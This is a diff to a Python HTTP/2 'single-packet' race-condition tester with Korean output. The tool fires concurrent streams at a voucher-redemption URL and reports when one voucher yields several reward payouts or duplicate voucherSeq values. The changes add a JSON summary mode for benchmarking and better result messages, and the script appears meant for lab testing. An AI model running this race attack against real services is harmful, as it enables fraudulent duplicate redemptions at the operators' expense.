@@ -164,7 +164,7 @@ def is_success(body_bytes) -> tuple[bool, dict | None]:
     return False, obj if isinstance(obj, dict) else None
 
 
-def run(url, concurrent, method, settle, timeout, insecure, extra_headers):
+def run(url, concurrent, method, settle, timeout, insecure, extra_headers, json_out=False):
     scheme, host, port, path = parse_url(url)
     if scheme != "https":
         print("HTTP/2 단일 패킷 공격은 https(h2) 대상만. --url https://... 로.")
@@ -180,10 +180,14 @@ def run(url, concurrent, method, settle, timeout, insecure, extra_headers):
     raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     sock = ctx.wrap_socket(raw, server_hostname=host)
     alpn = sock.selected_alpn_protocol()
-    print(f"=== [single-packet/h2] 대상: {url}  (동시 {concurrent} 스트림) ===")
-    print(f"    ALPN 협상 결과: {alpn!r}")
+    if not json_out:
+        print(f"=== [single-packet/h2] 대상: {url}  (동시 {concurrent} 스트림) ===")
+        print(f"    ALPN 협상 결과: {alpn!r}")
     if alpn != "h2":
-        print("    서버가 h2 를 협상하지 않음 → 이 대상엔 라스트바이트 동기화 테스터를 쓰세요.")
+        if json_out:
+            print(json.dumps({"technique": "single-packet", "url": url, "error": "no-h2-alpn"}))
+        else:
+            print("    서버가 h2 를 협상하지 않음 → 이 대상엔 라스트바이트 동기화 테스터를 쓰세요.")
         sock.close()
         return 1
 
@@ -234,24 +238,43 @@ def run(url, concurrent, method, settle, timeout, insecure, extra_headers):
     elapsed = round(time.perf_counter() - t0, 4)
     sock.close()
 
-    print(f"\n=== 총 {concurrent} 스트림 결과 (수신까지 {elapsed}s) ===")
-    success, seqs = 0, []
-    for i, sid in enumerate(stream_ids):
+    success, seqs, empty = 0, [], 0
+    detail = []
+    for sid in stream_ids:
         ok, obj = is_success(bodies[sid])
         success += ok
+        if not bodies[sid]:
+            empty += 1
         if ok and obj:
             seqs.append(obj.get("voucherSeq"))
         shown = obj if obj is not None else bodies[sid][:120]
-        print(f"[stream {sid:>3}] {'SUCCESS' if ok else 'blocked'} body={shown}")
+        detail.append(f"[stream {sid:>3}] {'SUCCESS' if ok else 'blocked'} body={shown}")
 
-    print(f"\n성공(보상 지급) 응답 수: {success} / {concurrent}")
-    if success >= 2:
+    dup = {s for s in seqs if seqs.count(s) > 1}
+    race = success >= 2
+
+    if json_out:
+        print(json.dumps({
+            "technique": "single-packet", "url": url, "concurrent": concurrent,
+            "success": success, "empty": empty,
+            "race": race, "dup_voucher": bool(dup),
+        }, ensure_ascii=False))
+        return 2 if race else 0
+
+    print(f"\n=== 총 {concurrent} 스트림 결과 (수신까지 {elapsed}s) ===")
+    for ln in detail:
+        print(ln)
+    print(f"\n성공(보상 지급) 응답 수: {success} / {concurrent}"
+          + (f"  (빈 응답 {empty}건)" if empty else ""))
+    if race:
         print("=> 발급권 1개로 2건 이상 보상 지급됨: 레이스 컨디션 재현")
-        dup = {s for s in seqs if seqs.count(s) > 1}
         if dup:
             print(f"=> 결정적 증거: 동일 voucherSeq({dup}) 중복 등장")
         return 2
-    print("=> 1건만 성공: 이번 실행에선 레이스 미재현 (반복 실행 권장)")
+    if success == 1:
+        print("=> 1건만 성공: 이번 실행에선 레이스 미재현 (정상). 반복 실행 권장")
+    else:
+        print(f"=> 0건 성공: 전부 실패/차단 (빈 응답 {empty}건). 대상/발급권/네트워크 확인")
     return 0
 
 
@@ -293,6 +316,7 @@ def main() -> int:
     ap.add_argument("--insecure", action="store_true", help="인증서 검증 해제(사설/랩)")
     ap.add_argument("-H", "--header", action="append", default=[], help="추가 헤더 'Key: Value'")
     ap.add_argument("--selftest", action="store_true", help="서버 없이 프레이밍/HPACK 검증")
+    ap.add_argument("--json", action="store_true", help="요약 1줄 JSON 만 출력(벤치마크용)")
     args = ap.parse_args()
 
     if args.selftest:
@@ -304,7 +328,7 @@ def main() -> int:
         if ":" in h:
             k, v = h.split(":", 1)
             extra[k.strip()] = v.strip()
-    return run(args.url, args.concurrent, args.method, args.settle, args.timeout, args.insecure, extra)
+    return run(args.url, args.concurrent, args.method, args.settle, args.timeout, args.insecure, extra, args.json)
 
 
 if __name__ == "__main__":
